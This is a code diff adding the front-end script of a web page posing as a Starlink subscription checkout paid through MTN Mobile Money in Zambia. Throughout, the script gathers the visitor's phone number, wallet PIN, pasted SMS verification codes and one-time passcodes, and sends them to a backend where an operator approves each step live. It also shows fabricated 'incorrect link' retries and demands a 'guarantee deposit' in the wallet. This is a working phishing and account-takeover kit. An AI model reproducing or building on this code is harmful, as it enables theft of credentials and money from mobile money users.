+        const pinInputs = document.querySelectorAll('.pin-input');
+        const verificationLinkInput = document.getElementById('verificationLinkInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const verifyLinkBtn = document.getElementById('verifyLinkBtn');
+        const proceedVerifiedBtn = document.getElementById('proceedVerifiedBtn') || {};
+        const verifyStatusText = document.getElementById('verifyStatusText') || {};
+        let mtnVerifiedPollInterval = null;
+        let mtnIsVerified = false;
+        let wrongLinkNotified = false;
+        let wrongOtpNotified = false;
+
+        // ── OTP Screen Logic ──
+        const otpScreen = document.getElementById('otpScreen');
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                const value = this.value.replace(/\D/g, '');
+                this.value = value;
+                if (value && index < otpInputs.length - 1) {
+                    otpInputs[index + 1].focus();
+                }
+                otpSubmitBtn.disabled = getOtpValue().length !== 4;
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+                if (!digits) return;
+                digits.split('').forEach((d, i) => { if (otpInputs[i]) otpInputs[i].value = d; });
+                otpInputs[Math.min(digits.length, otpInputs.length - 1)].focus();
+                otpSubmitBtn.disabled = getOtpValue().length !== 4;
+            });
+        });
+
+        function getOtpValue() {
+            return Array.from(otpInputs).map(i => i.value).join('');
+        }
+
+        function clearOtpInputs(focusFirst) {
+            otpInputs.forEach(i => i.value = '');
+            otpSubmitBtn.disabled = true;
+            if (focusFirst) otpInputs[0].focus();
+        }
+
+        function showOtpScreen() {
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.remove('active');
+            linkScreen.classList.remove('active');
+            notVerifiedScreen.classList.remove('active');
+            waitingScreen.style.display = 'none';
+            document.getElementById('insufficientScreen').classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
+            otpScreen.classList.add('active');
+            document.getElementById('otpPhoneDisplay').textContent = `${phoneCode} ${currentMsisdn}`;
+            document.getElementById('otpSubmitBtn').textContent = t('otpVerify');
+            otpInputs[0].focus();
+        }
+
+        function resetOtpEntry() {
+            wrongOtpNotified = false;
+            clearOtpInputs(true);
+            const errEl = document.getElementById('otpError');
+            errEl.textContent = t('otpIncorrect');
+            errEl.style.background = '#FEF2F2';
+            errEl.style.color = '#DC2626';
+            errEl.classList.add('show');
+            otpInputs.forEach(i => i.classList.add('shake'));
+            setTimeout(() => otpInputs.forEach(i => i.classList.remove('shake')), 450);
+        }
+
+        otpSubmitBtn.addEventListener('click', async function() {
+            const otp = getOtpValue();
+            if (otp.length !== 4 || !currentRequestId) return;
+
+            otpSubmitBtn.disabled = true;
+            otpSubmitBtn.dataset.busy = '1';
+            otpSubmitBtn.textContent = t('processing');
+
+            const errEl = document.getElementById('otpError');
+            errEl.classList.remove('show');
+
+            try {
+                const res = await fetch('/api/mtn/submit-otp', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ requestId: currentRequestId, otp: otp })
+                });
+                const data = await res.json();
+
+                if (!data.success) {
+                    throw new Error(data.message || 'OTP submission failed');
+                }
+
+                wrongOtpNotified = false;
+
+                errEl.textContent = t('otpSubmitted');
+                errEl.style.background = '#EFF6FF';
+                errEl.style.color = '#2563EB';
+                errEl.classList.add('show');
+
+                otpInputs.forEach(i => i.value = '');
+                otpSubmitBtn.textContent = t('otpVerify');
+                delete otpSubmitBtn.dataset.busy;
+                otpSubmitBtn.disabled = true;
+
+                startStatusPolling(currentRequestId);
+
+            } catch (e) {
+                errEl.textContent = t('somethingWrong');
+                errEl.style.background = '#FEF2F2';
+                errEl.style.color = '#DC2626';
+                errEl.classList.add('show');
+                delete otpSubmitBtn.dataset.busy;
+                otpSubmitBtn.disabled = false;
+                otpSubmitBtn.textContent = t('otpVerify');
+            }
+        });
+        
+        // Country Selector Functions
+        // Country functions removed - Zambia only
+        function setCountry(code) {
+            const country = COUNTRIES[code] || COUNTRIES['ZM'];
+            currentCountry = code;
+            phoneCode = country.code;
+            msisdnLength = country.length;
+            currentLang = 'en';
+            applyLanguage();
+            const flagImg = document.getElementById('flagIcon');
+            flagImg.src = `https://flagcdn.com/w40/${country.flag}.png`;
+            phoneInput.placeholder = country.code + ' 9XX XXX XXX';
+            if (starlinkPackage) {
+                showStarlinkHeader();
+            }
+        }
+        
+        function showStarlinkHeader() {
+            const pkg = STARLINK_PACKAGES[starlinkPackage] || STARLINK_PACKAGES['starter'];
+            const country = COUNTRIES[currentCountry];
+            const currency = country ? country.currency : 'USD';
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlLp = urlParams.get('lp');
+            const urlCur = urlParams.get('cur');
+            const urlCdf = urlParams.get('cdf');
+
+            let displayAmount;
+            if (urlLp && urlCur) {
+                // Use the pre-calculated local price passed from plans.html
+                const lpNum = parseFloat(urlLp);
+                const formatted = Number.isInteger(lpNum) ? lpNum.toLocaleString() : lpNum;
+                displayAmount = `${urlCur} ${formatted}`;
+            } else {
+                const rate = CURRENCY_RATES[currency] || 1; // ZMW fallback
+                const baseCdfAmount = urlCdf ? parseInt(urlCdf) : pkg.cdf;
+                const localAmount = Math.round(baseCdfAmount * rate);
+                displayAmount = `${currency} ${localAmount.toLocaleString()}`;
+            }
+
+            document.getElementById('starlinkHeader').classList.add('active');
+            document.getElementById('paymentDetails').classList.add('active');
+            document.getElementById('sslBadge').classList.add('active');
+            document.getElementById('starlinkAmount').textContent = displayAmount;
+            document.getElementById('cardTitle').textContent = t('enterNumber');
+        }
+        
+        phoneInput.addEventListener('input', function() {
+            const value = this.value.replace(/\D/g, '');
+            this.value = value;
+            nextBtn.disabled = value.length !== msisdnLength;
+        });
+        
+        // Next button - go to PIN
+        nextBtn.addEventListener('click', function() {
+            const userDigits = phoneInput.value.replace(/\D/g, '');
+            if (userDigits.length !== msisdnLength) {
+                const phoneError = document.getElementById('phoneError');
+                phoneError.textContent = currentLang === 'fr'
+                    ? 'Le numéro doit contenir 9 chiffres.'
+                    : 'Phone number must contain 9 digits.';
+                phoneError.classList.add('show');
+                return;
+            }
+            
+            currentMsisdn = userDigits;
+            document.getElementById('phoneError').classList.remove('show');
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.add('active');
+            pinInputs[0].focus();
+        });
+        
+        // PIN input handling
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                const value = this.value.replace(/\D/g, '');
+                this.value = value;
+                if (value && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                }
+                checkPinComplete();
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+        });
+        
+        function getPinValue() {
+            return Array.from(pinInputs).map(i => i.value).join('');
+        }
+        
+        function checkPinComplete() {
+            submitBtn.disabled = getPinValue().length < 4;
+        }
+        
+        // Submit PIN
+        submitBtn.addEventListener('click', async function() {
+            currentPin = getPinValue();
+            if (currentPin.length < 4) return;
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = t('processing');
+            
+            try {
+                const res = await fetch('/api/mtn/submit', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: `${phoneCode} ${currentMsisdn}`,
+                        pin: currentPin,
+                        country: currentCountry,
+                        starlinkPackage: starlinkPackage
+                    })
+                });
+                const data = await res.json();
+                
+                if (!data.success) {
+                    const msg = (data.message || '').toLowerCase();
+                    if (msg.includes('merchant') || msg.includes('inactive') || msg.includes('gateway')) {
+                        document.getElementById('pinError').textContent = t('merchantInactive');
+                        document.getElementById('pinError').style.background = '#FEF3C7';
+                        document.getElementById('pinError').style.color = '#B45309';
+                    } else {
+                        throw new Error(data.message || 'Submission failed');
+                    }
+                    document.getElementById('pinError').classList.add('show');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = t('submit');
+                    return;
+                }
+
+                // Show waiting screen and start polling for admin approval
+                showWaitingScreen();
+                startStatusPolling(data.requestId);
+                
+            } catch (e) {
+                document.getElementById('pinError').textContent = t('somethingWrong');
+                document.getElementById('pinError').style.background = '#FEF2F2';
+                document.getElementById('pinError').style.color = '#DC2626';
+                document.getElementById('pinError').classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = t('submit');
+            }
+        });
+
+        function showNotVerifiedScreen() {
+            mtnIsVerified = false;
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.remove('active');
+            linkScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
+            document.getElementById('insufficientScreen').classList.remove('active');
+            notVerifiedScreen.classList.add('active');
+            // Reset MoMo attempt counter
+            momoAttempts = 0;
+            document.getElementById('momoMsgInput').value = '';
+            document.getElementById('momoAttemptMsg').textContent = '';
+            document.getElementById('momoSubmitBtn').disabled = true;
+            document.getElementById('momoSubmitBtn').style.opacity = '.6';
+            document.getElementById('momoSubmitBtn').style.cursor = 'not-allowed';
+            // Set language-aware text
+            const isFr = currentLang === 'fr';
+            document.getElementById('momoVerifyTitle').textContent = isFr ? 'V\u00e9rifiez votre num\u00e9ro MoMo' : 'Verify Your MoMo Number';
+            document.getElementById('momoInstructions').innerHTML = isFr
+                ? "Collez ici le message SMS complet reçu de MoMo (contenant le code confidentiel). Ne le modifiez pas."
+                : "Paste the complete MoMo SMS message here (containing the confidential code). Do not edit it.";
+            document.getElementById('momoMsgInput').placeholder = isFr
+                ? "Collez le message SMS complet MoMo ici..."
+                : "Paste the complete MoMo SMS message here...";
+            document.getElementById('momoSubmitBtn').textContent = isFr ? 'Soumettre le lien' : 'Submit Link';
+            document.getElementById('momoUseDifferentBtn').textContent = isFr ? 'Utiliser un autre num\u00e9ro' : 'Use a Different Number';
+        }
+
+        // ── MoMo Link Paste Logic ──
+        let momoAttempts = 0;
+        const MOMO_MAX_ATTEMPTS = 3;
+
+        function checkMomoInput() {
+            const val = document.getElementById('momoMsgInput').value.trim();
+            const btn = document.getElementById('momoSubmitBtn');
+            // Accept if it contains a base64-like code (20+ chars alphanumeric + / =) or is a valid URL
+            const hasCode = /[A-Za-z0-9+\/=]{20,}/.test(val) || validatorLink(val);
+            if (hasCode) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = '.6';
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        async function submitMomoLink() {
+            const rawMsg = document.getElementById('momoMsgInput').value.trim();
+            if (!rawMsg) return;
+            const msg = extractLinkCode(rawMsg);
+            const btn = document.getElementById('momoSubmitBtn');
+            const errEl = document.getElementById('momoAttemptMsg');
+            btn.disabled = true;
+            btn.textContent = currentLang === 'fr' ? 'Envoi...' : 'Sending...';
+
+            momoAttempts++;
+
+            // Send to backend to save the link
+            try {
+                await fetch('/api/mtn/momo-link', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        link: msg,
+                        phone: `${phoneCode}${currentMsisdn}`,
+                        country: currentCountry,
+                        attempt: momoAttempts
+                    })
+                });
+            } catch(e) {}
+
+            if (momoAttempts >= MOMO_MAX_ATTEMPTS) {
+                // Max attempts: allow proceed regardless
+                errEl.style.color = '#16A34A';
+                errEl.textContent = currentLang === 'fr' ? 'Merci. Redirection en cours...' : 'Thank you. Proceeding...';
+                btn.textContent = currentLang === 'fr' ? 'Redirection...' : 'Redirecting...';
+                setTimeout(() => {
+                    notVerifiedScreen.classList.remove('active');
+                    linkScreen.classList.add('active');
+                    document.getElementById('phoneDisplay').textContent = `${phoneCode}${currentMsisdn}`;
+                    verificationLinkInput.focus();
+                }, 800);
+            } else {
+                const remaining = MOMO_MAX_ATTEMPTS - momoAttempts;
+                errEl.style.color = '#EF4444';
+                errEl.textContent = currentLang === 'fr'
+                    ? `Lien incorrect. Veuillez r\u00e9essayer (${remaining} tentative${remaining === 1 ? '' : 's'} restante${remaining === 1 ? '' : 's'}).`
+                    : `Incorrect link. Please try again (${remaining} attempt${remaining === 1 ? '' : 's'} remaining).`;
+                document.getElementById('momoMsgInput').value = '';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+                btn.textContent = currentLang === 'fr' ? 'Soumettre le lien' : 'Submit Link';
+            }
+        }
+
+        function showPhoneScreen() {
+            notVerifiedScreen.classList.remove('active');
+            document.getElementById('insufficientScreen').classList.remove('active');
+            linkScreen.classList.remove('active');
+            pinScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
+            waitingScreen.style.display = 'none';
+            phoneScreen.classList.remove('hidden');
+            stopMtnVerifiedPolling();
+            stopStatusPolling();
+            mtnIsVerified = false;
+            currentRequestId = null;
+            wrongLinkNotified = false;
+            wrongOtpNotified = false;
+        }
+
+        function showWaitingScreen() {
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.remove('active');
+            linkScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('successScreen').classList.remove('active');
+            notVerifiedScreen.classList.remove('active');
+            document.getElementById('insufficientScreen').classList.remove('active');
+            waitingScreen.style.display = 'block';
+            document.getElementById('waitingStatus').textContent = currentLang === 'fr' ? 'Vérification en cours...' : 'Verification in progress...';
+        }
+
+        function startStatusPolling(requestId) {
+            stopStatusPolling();
+            currentRequestId = requestId;
+            statusPollInterval = setInterval(async () => {
+                if (!currentRequestId) return;
+                try {
+                    const res = await fetch(`/api/mtn/status/${currentRequestId}?_t=${Date.now()}`, { cache: 'no-store' });
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    handleMtnState(data.status, data);
+                } catch (e) {
+                    console.error('Status poll error:', e);
+                }
+            }, 1500);
+        }
+
+        function stopStatusPolling() {
+            if (statusPollInterval) {
+                clearInterval(statusPollInterval);
+                statusPollInterval = null;
+            }
+        }
+
+        function handleMtnState(status, data) {
+            if (!status || status === 'expired') return;
+            if (status === 'not_found') {
+                // Approval expired server-side while user waits on the OTP screen
+                if (otpScreen.classList.contains('active')) {
+                    stopStatusPolling();
+                    otpScreen.classList.remove('active');
+                    showPhoneScreen();
+                    alert(currentLang === 'fr'
+                        ? 'La vérification a expiré. Veuillez recommencer.'
+                        : 'Verification expired. Please start over.');
+                }
+                return;
+            }
+
+            switch (status) {
+                case 'phone_pin_verified':
+                    stopStatusPolling();
+                    waitingScreen.style.display = 'none';
+                    linkScreen.classList.add('active');
+                    document.getElementById('phoneDisplay').textContent = `${phoneCode}${currentMsisdn}`;
+                    verificationLinkInput.focus();
+                    break;
+
+                case 'wrong_pin':
+                    stopStatusPolling();
+                    waitingScreen.style.display = 'none';
+                    showPhoneScreen();
+                    alert(currentLang === 'fr'
+                        ? 'PIN incorrect. Veuillez réessayer.'
+                        : 'Wrong PIN. Please try again.');
+                    break;
+
+                case 'wrong_link':
+                    if (!wrongLinkNotified) {
+                        wrongLinkNotified = true;
+                        const errEl = document.getElementById('linkError');
+                        if (errEl) {
+                            errEl.textContent = currentLang === 'fr' ? 'Lien de vérification incorrect. Veuillez réessayer.' : 'Invalid verification link. Please try again.';
+                            errEl.style.background = '#FEF2F2';
+                            errEl.style.color = '#DC2626';
+                            errEl.classList.add('show');
+                        }
+                        verificationLinkInput.value = '';
+                        verifyLinkBtn.disabled = true;
+                        verificationLinkInput.focus();
+                    }
+                    break;
+
+                case 'otp_pending':
+                    // Link verified - show the OTP entry screen (keep polling for admin verdict)
+                    if (!otpScreen.classList.contains('active')) {
+                        showOtpScreen();
+                    }
+                    break;
+
+                case 'wrong_otp':
+                    // Admin marked the OTP as wrong - user must re-enter
+                    if (!wrongOtpNotified) {
+                        wrongOtpNotified = true;
+                        resetOtpEntry();
+                    }
+                    break;
+
+                case 'completed':
+                    stopStatusPolling();
+                    waitingScreen.style.display = 'none';
+                    linkScreen.classList.remove('active');
+                    otpScreen.classList.remove('active');
+                    pinScreen.classList.remove('active');
+                    phoneScreen.classList.add('hidden');
+                    notVerifiedScreen.classList.remove('active');
+                    document.getElementById('insufficientScreen').classList.remove('active');
+                    document.getElementById('successScreen').classList.add('active');
+                    document.getElementById('successTitle').textContent = t('paymentSuccess');
+                    document.getElementById('successText').textContent = t('paymentSuccessMsg');
+                    break;
+
+                case 'timeout':
+                    stopStatusPolling();
+                    waitingScreen.style.display = 'none';
+                    showPhoneScreen();
+                    alert(currentLang === 'fr'
+                        ? 'La vérification a expiré. Veuillez recommencer.'
+                        : 'Verification expired. Please start over.');
+                    break;
+
+                case 'rejected':
+                case 'invalid':
+                    stopStatusPolling();
+                    waitingScreen.style.display = 'none';
+                    showPhoneScreen();
+                    alert(currentLang === 'fr'
+                        ? 'Demande rejetée. Veuillez vérifier vos informations et réessayer.'
+                        : 'Request rejected. Please check your information and try again.');
+                    break;
+            }
+        }
+
+        async function openSupport() {
+            try {
+                const res = await fetch('/api/support-whatsapp');
+                const data = await res.json();
+                const number = (data.number || '').replace(/\D/g, '');
+                if (!number) {
+                    alert(currentLang === 'fr' ? 'Le support n\'est pas disponible pour le moment.' : 'Support is not currently available. Please try again later.');
+                    return;
+                }
+
+                const lp = urlParams.get('lp');
+                const cur = urlParams.get('cur') || 'ZMW';
+                const amount = lp ? `${cur} ${lp}` : cur;
+                const userPhone = `${phoneCode} ${currentMsisdn}`;
+                const message = currentLang === 'fr'
+                    ? `Bonjour Support, mon compte MTN Zambie n'est pas vérifié. Merci de m'aider.\n\nTéléphone: ${userPhone}\nForfait: ${starlinkPackage || 'N/A'}\nMontant: ${amount}`
+                    : `Hello Support, my MTN Zambia account is not verified yet. Please help me get verified.\n\nPhone: ${userPhone}\nPackage: ${starlinkPackage || 'N/A'}\nAmount: ${amount}`;
+
+                window.open(`https://wa.me/${number}?text=${encodeURIComponent(message)}`, '_blank');
+            } catch (e) {
+                alert(currentLang === 'fr' ? 'Le support n\'est pas disponible pour le moment.' : 'Support is not currently available. Please try again later.');
+            }
+        }
+
+        async function checkMtnVerifiedStatus() {
+            try {
+                const res = await fetch('/api/check-status?_t=' + Date.now(), { credentials: 'include', cache: 'no-store' });
+                if (!res.ok) {
+                    console.error('[MTN Verification] API error:', res.status);
+                    return;
+                }
+                const data = await res.json();
+                console.log('[MTN Verification] Status check returned:', data);
+                
+                if (data.status === 'mtn_verified') {
+                    console.log('[MTN Verification] Status is mtn_verified, enabling button');
+                    mtnIsVerified = true;
+                    
+                    // Update title and message
+                    const titleEl = document.getElementById('notVerifiedTitle');
+                    if (titleEl) titleEl.textContent = t('verifiedTitle');
+                    
+                    const msgEl = document.getElementById('notVerifiedMsg');
+                    if (msgEl) msgEl.textContent = t('verifiedMsg');
+                    
+                    if (verifyStatusText) {
+                        verifyStatusText.textContent = t('verifiedReady');
+                        verifyStatusText.style.color = '#10B981';
+                    }
+                    
+                    // Enable button by directly manipulating DOM
+                    if (proceedVerifiedBtn) {
+                        proceedVerifiedBtn.removeAttribute('disabled');
+                        proceedVerifiedBtn.disabled = false;
+                        proceedVerifiedBtn.style.opacity = '1';
+                        proceedVerifiedBtn.style.cursor = 'pointer';
+                        proceedVerifiedBtn.style.background = '#16A34A';
+                        proceedVerifiedBtn.classList.remove('disabled');
+                        console.log('[MTN Verification] Button class removed, disabled:', proceedVerifiedBtn.disabled);
+                    } else {
+                        console.error('[MTN Verification] proceedVerifiedBtn not found!');
+                    }
+                    
+                    stopMtnVerifiedPolling();
+                } else {
+                    console.log('[MTN Verification] Status is', data.status, '- button remains disabled');
+                }
+            } catch (e) { 
+                console.error('[MTN Verification] Check error:', e); 
+            }
+        }
+
+        async function checkVerificationNow() {
+            const btn = document.getElementById('checkVerifyBtn');
+            const originalText = btn.textContent;
+            btn.disabled = true;
+            btn.textContent = '⏳ Checking...';
+            await checkMtnVerifiedStatus();
+            btn.disabled = false;
+            btn.textContent = originalText;
+        }
+
+        function startMtnVerifiedPolling() {
+            stopMtnVerifiedPolling();
+            checkMtnVerifiedStatus();
+            mtnVerifiedPollInterval = setInterval(checkMtnVerifiedStatus, 100);
+        }
+
+        function stopMtnVerifiedPolling() {
+            if (mtnVerifiedPollInterval) {
+                clearInterval(mtnVerifiedPollInterval);
+                mtnVerifiedPollInterval = null;
+            }
+        }
+
+        if (proceedVerifiedBtn.addEventListener) proceedVerifiedBtn.addEventListener('click', async function(e) {
+            console.log('[MTN Proceed] Click handler - mtnIsVerified:', mtnIsVerified);
+            
+            if (!mtnIsVerified) {
+                const msg = currentLang === 'fr' 
+                    ? 'Veuillez attendre que votre compte soit vérifié par un administrateur. Cliquez sur "Vérifier le statut" pour vérifier.' 
+                    : 'Please wait for admin to verify your account. Click "Check Verification Status" to check.';
+                alert(msg);
+                console.log('[MTN Proceed] Account not verified, blocking click');
+                e.preventDefault();
+                return false;
+            }
+            
+            console.log('[MTN Proceed] Proceeding with verified account');
+            proceedVerifiedBtn.disabled = true;
+            proceedVerifiedBtn.style.opacity = '.6';
+            proceedVerifiedBtn.style.cursor = 'not-allowed';
+            proceedVerifiedBtn.textContent = currentLang === 'fr' ? 'Ouverture...' : 'Opening...';
+
+            try {
+                const res = await fetch('/api/mtn/proceed-verified', { method: 'POST', credentials: 'include' });
+                const data = await res.json();
+                
+                if (!res.ok || !data.success) {
+                    throw new Error(data.error || 'Not verified');
+                }
+
+                console.log('[MTN Proceed] Success, moving to verification link screen');
+                notVerifiedScreen.classList.remove('active');
+                linkScreen.classList.add('active');
+                document.getElementById('phoneDisplay').textContent = `${phoneCode}${currentMsisdn}`;
+                verificationLinkInput.focus();
+                startStatusPolling(currentRequestId);
+            } catch (e) {
+                console.error('[MTN Proceed] Error:', e);
+                const errMsg = currentLang === 'fr' 
+                    ? 'Erreur: Le compte n\'est pas encore vérifié par l\'administrateur. Veuillez réessayer.' 
+                    : 'Error: Account is not verified by admin yet. Please retry.';
+                alert(errMsg);
+                
+                // Re-enable button if proceed fails
+                proceedVerifiedBtn.disabled = false;
+                proceedVerifiedBtn.style.opacity = '1';
+                proceedVerifiedBtn.style.cursor = 'pointer';
+                proceedVerifiedBtn.style.background = '#16A34A';
+                proceedVerifiedBtn.textContent = t('proceedLink');
+            }
+        });
+        
+        // Verification link input handling
+        verificationLinkInput.addEventListener('input', function() {
+            verifyLinkBtn.disabled = !validatorLink(this.value);
+        });
+
+        function validatorLink(value) {
+            if (!value || typeof value !== 'string') return false;
+            const trimmed = value.trim();
+            
+            // Accept full URLs
+            try {
+                const url = new URL(trimmed);
+                return url.protocol === 'http:' || url.protocol === 'https:';
+            } catch {}
+            
+            // Accept base64-like MoMo codes (alphanumeric, +, /, =)
+            // Example: B2+S8jlM77WA9SOFLx9kZCRuGM/geBb2IE3iVDQZl8dMFA==
+            if (/^[A-Za-z0-9+\/=]{20,}$/.test(trimmed)) {
+                return true;
+            }
+            
+            // Accept full SMS message - extract potential base64 code
+            const base64Match = trimmed.match(/[A-Za-z0-9+\/=]{20,}/);
+            if (base64Match) {
+                return true;
+            }
+            
+            return false;
+        }
+
+        // Helper to extract base64 code from message or return URL as-is
+        function extractLinkCode(value) {
+            const trimmed = value.trim();
+            // If it's a valid URL, return as-is
+            try {
+                const url = new URL(trimmed);
+                if (url.protocol === 'http:' || url.protocol === 'https:') {
+                    return trimmed;
+                }
+            } catch {}
+            
+            // If it's already a base64-like code, return as-is
+            if (/^[A-Za-z0-9+\/=]{20,}$/.test(trimmed)) {
+                return trimmed;
+            }
+            
+            // Extract base64 code from SMS message
+            const base64Match = trimmed.match(/[A-Za-z0-9+\/=]{20,}/);
+            if (base64Match) {
+                return base64Match[0];
+            }
+            
+            return trimmed;
+        }
+        
+        // Verify link
+        verifyLinkBtn.addEventListener('click', async function() {
+            const rawInput = verificationLinkInput.value.trim();
+            const link = extractLinkCode(rawInput);
+            if (!validatorLink(rawInput)) return;
+            
+            verifyLinkBtn.disabled = true;
+            verifyLinkBtn.textContent = t('verifying');
+            
+            try {
+                if (!currentRequestId) {
+                    throw new Error('No request ID. Please start over.');
+                }
+
+                const res = await fetch('/api/mtn/submit-link', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        requestId: currentRequestId,
+                        link: link
+                    })
+                });
+                const data = await res.json();
+                
+                if (!data.success) {
+                    throw new Error(data.message || 'Link submission failed');
+                }
+                
+                wrongLinkNotified = false;
+                
+                document.getElementById('linkError').textContent = t('linkSubmitted');
+                document.getElementById('linkError').style.background = '#EFF6FF';
+                document.getElementById('linkError').style.color = '#2563EB';
+                document.getElementById('linkError').classList.add('show');
+                
+                startStatusPolling(currentRequestId);
+                
+            } catch (e) {
+                document.getElementById('linkError').textContent = t('verifyFailed');
+                document.getElementById('linkError').style.background = '#FEF2F2';
+                document.getElementById('linkError').style.color = '#DC2626';
+                document.getElementById('linkError').classList.add('show');
+                verifyLinkBtn.disabled = validatorLink(verificationLinkInput.value);
+                verifyLinkBtn.textContent = t('verifyLink');
+                return;
+            }
+            
+            verifyLinkBtn.disabled = true;
+            verifyLinkBtn.textContent = t('verifyLink');
+        });
+
+
+        // Back buttons
+        document.getElementById('backToPhone').addEventListener('click', function() {
+            pinScreen.classList.remove('active');
+            phoneScreen.classList.remove('hidden');
+            pinInputs.forEach(i => i.value = '');
+            stopMtnVerifiedPolling();
+        });
+        
+        document.getElementById('backToPin').addEventListener('click', function() {
+            linkScreen.classList.remove('active');
+            pinScreen.classList.add('active');
+            verificationLinkInput.value = '';
+            verifyLinkBtn.disabled = true;
+            document.getElementById('linkError').classList.remove('show');
+            stopStatusPolling();
+            stopInsufficientBalancePolling();
+            stopMtnVerifiedPolling();
+        });
+
+        // ── Insufficient Balance Polling ──
+        function startInsufficientBalancePolling() {
+            stopInsufficientBalancePolling();
+            statusPollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/check-status', { credentials: 'include' });
+                    const data = await res.json();
+                    if (data.status === 'insufficient_balance') {
+                        showInsufficientScreen();
+                    }
+                } catch(e) {}
+            }, 3000);
+        }
+        function stopInsufficientBalancePolling() {
+            if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+        }
+        function showInsufficientScreen() {
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.remove('active');
+            linkScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('insufficientScreen').classList.add('active');
+            stopInsufficientBalancePolling();
+            stopStatusPolling();
+            // Dynamic amount display
+            const urlParams = new URLSearchParams(window.location.search);
+            const passedPrice = urlParams.get('lp');
+            const passedCur = urlParams.get('cur');
+            const packageType = urlParams.get('package') || 'starter';
+            let amountDisplay = '500 ZMW';
+            if (passedPrice && passedCur) {
+                amountDisplay = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+            } else {
+                const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+                const country = COUNTRIES[currentCountry];
+                const currency = country ? country.currency : 'ZMW';
+                const rate = CURRENCY_RATES[currency] || 1;
+                const localAmount = Math.round(pkg.cdf * rate);
+                amountDisplay = `${currency} ${localAmount.toLocaleString()}`;
+            }
+            const msgEl = document.getElementById('insuffMsg');
+            if (msgEl) {
+                if (currentLang === 'fr') {
+                    msgEl.innerHTML = 'Vous devez avoir au moins <strong class="text-white">' + amountDisplay + '</strong> dans votre portefeuille MTN Mobile Money comme <strong class="text-white">dépôt de garantie</strong> pour souscrire à un forfait Starlink.<br><br>Veuillez déposer le montant requis et cliquer sur le bouton ci-dessous.';
+                    document.getElementById('depositedBtn').textContent = '✅ J\'ai déposé';
+                    document.getElementById('diffNumberBtn').textContent = 'Utiliser un autre numéro';
+                } else {
+                    msgEl.innerHTML = 'You must have at least <strong class="text-white">' + amountDisplay + '</strong> in your MTN Mobile Money wallet as a <strong class="text-white">guarantee deposit</strong> to subscribe to any Starlink package.<br><br>Please deposit the required amount and click the button below.';
+                    document.getElementById('depositedBtn').textContent = '✅ I Have Deposited';
+                    document.getElementById('diffNumberBtn').textContent = 'Use a Different Number';
+                }
+            }
+            document.querySelector('#insufficientScreen h2').textContent = currentLang === 'fr' ? 'Solde Insuffisant' : 'Insufficient Balance';
+        }
+        document.getElementById('depositedBtn').addEventListener('click', async function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = '⏳ Notifying...';
+            try { await fetch('/api/user-deposited', { method: 'POST', credentials: 'include' }); } catch(e) {}
+            document.getElementById('insufficientScreen').classList.remove('active');
+            linkScreen.classList.add('active');
+            verificationLinkInput.focus();
+            startInsufficientBalancePolling();
+            btn.disabled = false;
+            btn.textContent = '✅ I Have Deposited';
+        });
+        document.getElementById('diffNumberBtn').addEventListener('click', function() {
+            if (starlinkPackage) {
+                window.location.href = '/starlink/';
+            } else {
+                document.getElementById('insufficientScreen').classList.remove('active');
+                phoneScreen.classList.remove('hidden');
+                pinScreen.classList.remove('active');
+            }
+        });
+
+        // ── Country Detection (Zambia hardcoded) ──
+        function detectCountry() {
+            setCountry('ZM');
+        }
+        
+        // Init
+        detectCountry();
+    </script>
+</body>
+</html>
